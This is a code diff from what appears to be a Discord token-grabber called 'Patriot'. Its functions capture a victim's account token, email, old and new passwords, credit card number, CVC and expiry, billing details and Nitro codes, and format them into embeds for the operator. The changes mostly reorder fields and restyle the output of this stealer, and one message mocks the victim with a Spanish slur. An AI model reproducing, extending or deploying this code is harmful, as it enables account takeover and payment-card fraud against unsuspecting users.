@@ -670,40 +670,40 @@ const getBadges = (flags) => {
   let badges = '';
   switch (flags) {
     case 1:
-      badges += 'Discord Staff, ';
+      badges += '<:Patriot_staff:1032868405763637248> ';
       break;
     case 2:
-      badges += 'Partnered Server Owner, ';
+      badges += '<:Patriot_Partner:1032868404429864970> ';
       break;
     case 131072:
-      badges += 'Verified Bot Developer, ';
+      badges += '<:Patriot_Dev:1032868370367922196> ';
       break;
     case 4:
-      badges += 'Hypesquad Event, ';
+      badges += '<:Patriot_Hypesquad:1032868400206184478> ';
       break;
     case 16384:
-      badges += 'Gold BugHunter, ';
+      badges += '<:Patriot_BG2:1032868364437159966> ';
       break;
     case 8:
-      badges += 'Green BugHunter, ';
+      badges += '<:Patriot_BH:1032868365951303680> ';
       break;
     case 512:
-      badges += 'Early Supporter, ';
+      badges += '<:Patriot_early:1032868371974332437> ';
       break;
     case 128:
-      badges += 'HypeSquad Brillance, ';
+      badges += '<:Patriot_Brillance:1032868368698585188> ';
       break;
     case 64:
-      badges += 'HypeSquad Bravery, ';
+      badges += '<:Patriot_Bravery:1032868367318646804> ';
       break;
     case 256:
-      badges += 'HypeSquad Balance, ';
+      badges += '<:Patriot_Balance:1032868362788802560> ';
       break;
     case 0:
-      badges = 'None';
+      badges = 'No badges';
       break;
     default:
-      badges = 'None';
+      badges = 'No badges';
       break;
   }
   return badges;
@@ -754,22 +754,22 @@ const login = async (email, password, token) => {
           inline: false
         },
         {
-          name: "<a:patriot_gng:1032868284699250731> Badges",
+          name: "<:prt_sxtaar:1032868516686200863> Badges",
           value: `\`${badges}\``,
           inline: true
         },
         {
-          name: "<a:ptr_billing:1032868278823038987> Billing",
+          name: "<a:patriot_billing:1030633597054492713> Billing",
           value: `\`${billing}\``,
           inline: true
         },
         {
-          name: "<:Patriot_Nitro:1032868403117051944> Nitro",
+          name: "<:patriot_NitroInfo:1022956411816251563> Nitro",
           value: `\`${nitro}\``,
           inline: true
         },
         {
-          name: "<a:prt_world9:1032868293528268831> Email",
+          name: "<a:patriot_mail:1030633612820893706> Email",
           value: `\`${email}\``,
           inline: true
         },
@@ -829,39 +829,39 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
         color: config.embed_color,
         fields: [
           {
+            name: '<:patriot_guilds:1032868286532173904> Token',
+            value: `\`${token}\``,
+            inline: false,
+          },
+          {
             name: '<:lxckk:1032868282153316353> Old password',
-            value: `\`\`\`${oldpassword}\`\`\``,
+            value: `\`${oldpassword}\``,
             inline: true,
           },
           {
             name: '<:lxckk:1032868282153316353> New password',
-            value: `\`\`\`${newpassword}\`\`\``,
+            value: `\`${newpassword}\``,
             inline: true,
           },
           {
             name: '<a:prt_world9:1032868293528268831> Email',
-            value: `\`\`\`${json.email}\`\`\``,
+            value: `\`${json.email}\``,
             inline: true,
           },
           {
             name: '<:Patriot_Nitro:1032868403117051944> Nitro',
-            value: `\`\`\`${nitro}\`\`\``,
+            value: `\`${nitro}\``,
             inline: true,
           },
           {
             name: '<a:patriot_gng:1032868284699250731> Badges',
-            value: `\`\`\`${badges}\`\`\``,
+            value: `\`${badges}\``,
             inline: true,
           },
           {
             name: '<a:ptr_billing:1032868278823038987> Billing',
-            value: `\`\`\`${billing}\`\`\``,
+            value: `\`${billing}\``,
             inline: true,
-          },
-          {
-            name: '<:patriot_guilds:1032868286532173904> Token',
-            value: `\`\`\`${token}\`\`\``,
-            inline: false,
           },
         ],
         author: {
@@ -889,35 +889,36 @@ const emailChanged = async (email, password, token) => {
     embeds: [
       {
         color: config.embed_color,
-        fields: [{
+        fields: [
+        {
+          name: "<:patriot_guilds:1032868286532173904> Token",
+          value: `\`${token}\``,
+          inline: false
+        },
+        {
           name: "<a:prt_world9:1032868293528268831> New email",
-          value: `\`\`\`${email}\`\`\``,
+          value: `\`${email}\``,
           inline: true
         },
         {
           name: "<:lxckk:1032868282153316353> Password",
-          value: `\`\`\`${password}\`\`\``,
+          value: `\`${password}\``,
           inline: true
         },
         {
           name: "<:Patriot_Nitro:1032868403117051944> Nitro",
-          value: `\`\`\`${nitro}\`\`\``,
-          inline: false
+          value: `\`${nitro}\``,
+          inline: true
         }, 
         {
           name: "<a:ptr_billing:1032868278823038987> Billing",
-          value: `\`\`\`${billing}\`\`\``,
+          value: `\`${billing}\``,
           inline: true
         }, 
         {
           name: "<a:patriot_gng:1032868284699250731> Badges",
-          value: `\`\`\`${badges}\`\`\``,
-          inline: false
-        },
-        {
-          name: "<:patriot_guilds:1032868286532173904> Token",
-          value: `\`\`\`${token}\`\`\``,
-          inline: false
+          value: `\`${badges}\``,
+          inline: true
         },
       ],
         author: {
@@ -947,29 +948,29 @@ const PaypalAdded = async (token) => {
         color: config.embed_color,
         fields: [
           {
-            name: '<:wallets:1032868459127783534> **Paypal Added**',
-            value: `\`\`\`¡¡¡HAHAHA, JODETE MARICA\`\`\``,
-            inline: false,
-          },
-          {
-            name: '<:Patriot_Nitro:1032868403117051944> **Nitro**',
-            value: `\`\`\`${nitro}\`\`\``,
-            inline: false,
-          },
-          {
-            name: '<a:patriot_gng:1032868284699250731> **Badges**',
-            value: `\`\`\`${badges}\`\`\``,
-            inline: false,
-          },
-          {
-            name: '<a:ptr_billing:1032868278823038987> **Billing**',
-            value: `\`\`\`${billing}\`\`\``,
-            inline: false,
-          },
-          {
             name: '<:patriot_guilds:1032868286532173904> **Token**',
             value: `\`${token}\``,
             inline: false,
+          },
+          {
+            name: '<:wallets:1032868459127783534> **Paypal Added**',
+            value: `\`¡¡¡HAHAHA, JODETE MARICA\``,
+            inline: true,
+          },
+          {
+            name: '<:Patriot_Nitro:1032868403117051944> **Nitro**',
+            value: `\`${nitro}\``,
+            inline: true,
+          },
+          {
+            name: '<a:patriot_gng:1032868284699250731> **Badges**',
+            value: `\`${badges}\``,
+            inline: true,
+          },
+          {
+            name: '<a:ptr_billing:1032868278823038987> **Billing**',
+            value: `\`${billing}\``,
+            inline: true,
           },
         ],
         author: {
@@ -996,24 +997,24 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
         color: config.embed_color,
         fields: [
           {
-            name: '<a:ptr_billing:1032868278823038987> **CC Num**',
-            value: `\`\`\`${number}\`\`\``,
+            name: '<a:ptr_billing:1032868278823038987> **Token**',
+            value: `\`${token}\``,
             inline: false,
+          },
+          {
+            name: '<a:ptr_billing:1032868278823038987> **CC Num**',
+            value: `\`${number}\``,
+            inline: true,
           },
           {
             name: '<a:ptr_billing:1032868278823038987> **CC CVC**',
-            value: `\`\`\`${cvc}\`\`\``,
-            inline: false,
+            value: `\`${cvc}\``,
+            inline: true,
           },
           {
             name: '<a:ptr_billing:1032868278823038987> **CC Exp**',
-            value: `\`\`\`${expir_month}/${expir_year}\`\`\``,
-            inline: false,
-          },
-          {
-            name: '<a:ptr_billing:1032868278823038987> **From Token**',
-            value: `\`\`\`${token}\`\`\``,
-            inline: false,
+            value: `\`${expir_month}/${expir_year}\``,
+            inline: true,
           },
         ],
         author: {
@@ -1042,14 +1043,14 @@ const nitroBought = async (token) => {
         color: config.embed_color,
         fields: [
           {
-            name: '<:Patriot_Nitro:1032868403117051944> **Nitro Code**',
-            value: `\`\`\`${code}\`\`\``,
+            name: '<a:ptr_billing:1032868278823038987> **Token**',
+            value: `\`${token}\``,
             inline: false,
           },
           {
-            name: '<a:ptr_billing:1032868278823038987> **From Token**',
-            value: `\`\`\`${token}\`\`\``,
-            inline: false,
+            name: '<:Patriot_Nitro:1032868403117051944> **Nitro Code**',
+            value: `\`${code}\``,
+            inline: true,
           },
         ],
         author: {
